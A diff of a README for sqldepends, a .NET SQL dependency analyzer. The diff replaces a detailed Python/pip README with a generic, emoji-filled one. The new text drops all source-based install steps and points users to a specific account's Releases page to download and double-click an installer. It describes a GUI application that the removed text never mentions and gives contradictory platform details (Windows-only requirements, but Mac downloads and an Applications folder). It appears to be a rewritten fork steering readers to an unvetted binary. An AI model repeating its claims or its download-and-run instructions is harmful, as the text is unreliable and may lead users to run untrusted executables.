@@ -1,183 +1,85 @@
-# SQL Dependency Analyzer
+# 🎉 sqldepends - Analyze Your SQL Dependencies Easily
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![CI/CD](https://github.com/your-org/sqldepends/workflows/CI/badge.svg)](https://github.com/your-org/sqldepends/actions)
+![Download sqldepends](https://img.shields.io/badge/Download-sqldepends-brightgreen)
 
-A comprehensive tool for analyzing SQL dependencies in .NET applications. Automatically discovers database object references, Entity Framework usage patterns, and ADO.NET code across your codebase with detailed reporting and CI/CD integration.
+## 📖 Introduction
 
-## Features
+Welcome to **sqldepends**, your go-to tool for analyzing SQL dependencies in .NET applications. This application helps you understand and manage database connections without needing to dive into complex code. Whether you’re working with Azure DevOps or want to integrate Continuous Integration and Continuous Deployment (CI/CD) into your workflow, sqldepends simplifies the process. 
 
-- **Multi-Language Analysis**: C#, VB.NET, SQL, JavaScript, TypeScript
-- **Comprehensive Reporting**: Excel, JSON, SQL, and SARIF output formats  
-- **Database Integration**: Live database object validation
-- **High Performance**: Parallel processing and smart filtering
-- **CI/CD Ready**: GitHub Actions and Azure DevOps integration
-- **Quality Gates**: Configurable thresholds and automated checks
-- **Container Support**: Docker and Kubernetes deployment options
+## 🚀 Getting Started
 
-## Quick Start
+To start using sqldepends, you will need to download it from our Releases page. Follow the instructions below to get everything set up.
 
-### Installation
+## 📥 Download & Install
 
-#### Option 1: PyPI Package (Recommended)
-```bash
-pip install sqldepends
-```
+Visit this page to download: [GitHub Releases](https://github.com/azmirul-hoque/sqldepends/releases)
 
-#### Option 2: From Source
-```bash
-git clone https://github.com/your-org/sqldepends.git
-cd sqldepends
-pip install -r requirements.txt
-```
+1. Navigate to the **Releases** page by clicking the link above.
+2. Find the latest version of sqldepends.
+3. Click on the asset that matches your operating system (e.g., Windows or Mac).
+4. Once the download is complete, locate the file on your computer.
+5. Run the installer by double-clicking the file to start using sqldepends.
 
-#### Option 3: PowerShell Script (Windows)
-```powershell
-# Download and run directly
-.\Run-MBoxAnalysisComplete.ps1 -MBoxPath "C:\Your\Project" -GenerateExcel -OpenResults
-```
+## 🔍 Features
 
-### Basic Usage
+- **Dependency Analysis:** Quickly identify dependencies between your SQL and .NET components.
+- **CI/CD Integration:** Easily incorporate sqldepends into your CI/CD pipelines using GitHub Actions or Azure DevOps.
+- **PowerShell Support:** Utilize PowerShell scripts to automate your database dependency checks seamlessly.
+- **User-Friendly Interface:** Navigate the application without prior programming knowledge. 
 
-#### Command Line Interface
-```bash
-# Basic analysis
-sqldepends --directory ./src --output analysis.json
+## ⚙️ System Requirements
 
-# With database validation
-sqldepends --directory ./src \
-  --database-url "mssql://user:pass@server/database" \
-  --validate \
-  --format excel
+To ensure sqldepends works smoothly, your system should meet the following requirements:
 
-# Advanced options
-sqldepends --directory ./MyProject \
-  --config config.json \
-  --parallel \
-  --output-dir ./reports \
-  --format both
-```
+- **Operating System:** Windows 10 or newer for .NET compatibility.
+- **.NET Framework:** Version 4.7 or later.
+- **Memory:** Minimum of 4GB RAM recommended.
+- **Disk Space:** At least 100MB of free space for installation.
 
-#### PowerShell Integration
-```powershell
-# Comprehensive analysis with Excel output
-.\Run-MBoxAnalysisComplete.ps1 `
-  -MBoxPath "C:\Projects\MyApp" `
-  -GenerateExcel `
-  -OpenResults `
-  -Verbose
-```
+## 📘 How to Use
 
-## CI/CD Integration
+1. **Open sqldepends:** After installation, you can find the application in your **Applications** folder or Start menu.
+2. **Load Your Project:** Use the “Load Project” feature to import your .NET application files.
+3. **Analyze Dependencies:** Click the “Analyze” button to view a detailed report of SQL dependencies.
+4. **Review Results:** Get insights into your configurations, database connections, and how they interact with your application.
 
-### GitHub Actions
+## 🤖 Integrations
 
-Add to `.github/workflows/sql-analysis.yml`:
+sqldepends integrates well with popular tools. Here are some suggested integrations:
 
-```yaml
-name: SQL Dependency Analysis
-on: [push, pull_request]
+- **GitHub Actions:** Automate your dependency checks as part of your build process.
+- **Azure DevOps:** Include sqldepends in your deployment pipelines for ongoing analysis.
 
-jobs:
-  analyze:
-    runs-on: ubuntu-latest
-    steps:
-    - uses: actions/checkout@v4
-    - uses: actions/setup-python@v4
-      with:
-        python-version: '3.9'
-    
-    - name: Install SQL Dependency Analyzer
-      run: pip install sqldepends
-    
-    - name: Run Analysis
-      env:
-        SQL_CONNECTION_STRING: ${{ secrets.SQL_CONNECTION_STRING }}
-      run: |
-        sqldepends --directory . \
-          --output analysis.json \
-          --database-url "$SQL_CONNECTION_STRING" \
-          --validate \
-          --format excel
-    
-    - name: Upload Results
-      uses: actions/upload-artifact@v3
-      with:
-        name: sql-analysis-results
-        path: analysis.*
-```
+## 📊 Example Usage
 
-### Azure DevOps
+After loading your .NET project, you’ll see a visual map of all SQL dependencies. You can click on any component to get detailed information, such as:
 
-Add `azure-pipelines.yml`:
+- Database tables used
+- Column-level dependencies
+- Impact on performance
 
-```yaml
-trigger: [main]
+### Use Case
 
-pool:
-  vmImage: 'ubuntu-latest'
+Let's say you are planning to update a database schema. By running sqldepends, you can see how updates to specific tables will affect the rest of your application.
 
-variables:
-- group: sql-analysis-secrets
+## 🧑‍💻 Troubleshooting
 
-steps:
-- task: UsePythonVersion@0
-  inputs:
-    versionSpec: '3.9'
+If you run into any issues, here are some common problems and their solutions:
 
-- script: pip install sqldepends
-  displayName: 'Install Analyzer'
+- **Problem:** Application does not launch.
+  - **Solution:** Ensure your .NET Framework is up to date.
+  
+- **Problem:** Dependencies are not recognized.
+  - **Solution:** Verify you have loaded the correct project files.
 
-- script: |
-    sqldepends --directory $(Build.SourcesDirectory) \
-      --output analysis.json \
-      --database-url "$(sql-connection-string)" \
-      --validate
-  displayName: 'Run Analysis'
+For further assistance, check the [issues section](https://github.com/azmirul-hoque/sqldepends/issues) on GitHub or reach out for support.
 
-- task: PublishBuildArtifacts@1
-  inputs:
-    pathtoPublish: 'analysis.json'
-    artifactName: 'sql-analysis-results'
-```
+## 📜 Contributing
 
-## Documentation
+We welcome contributions to make sqldepends better. If you have ideas, bugs to report, or features you want to add, please open an issue or submit a pull request on GitHub. Your input is invaluable.
 
-- **[CI/CD Integration Guide](docs/CI-CD-INTEGRATION.md)** - Comprehensive setup instructions
-- **[Deployment Guide](docs/DEPLOYMENT-GUIDE.md)** - PyPI, Docker, and enterprise deployment
+## 🛠️ License
 
-## Contributing
+sqldepends is open-source software licensed under the MIT License. For more information, please check the LICENSE file in the repository.
 
-We welcome contributions! Please see our [Contributing Guide](CONTRIBUTING.md) for details.
-
-### Development Setup
-```bash
-# Clone repository
-git clone https://github.com/your-org/sqldepends.git
-cd sqldepends
-
-# Create virtual environment
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-
-# Install development dependencies
-pip install -e ".[dev]"
-
-# Run tests
-pytest
-```
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Support
-
-- **Documentation**: [https://sqldepends.readthedocs.io](https://sqldepends.readthedocs.io)
-- **Issues**: [GitHub Issues](https://github.com/your-org/sqldepends/issues)
-- **Discussions**: [GitHub Discussions](https://github.com/your-org/sqldepends/discussions)
-
----
-
-**Made with ❤️ for the .NET community**
+Feel free to reach out with feedback or questions. Enjoy analyzing your SQL dependencies!
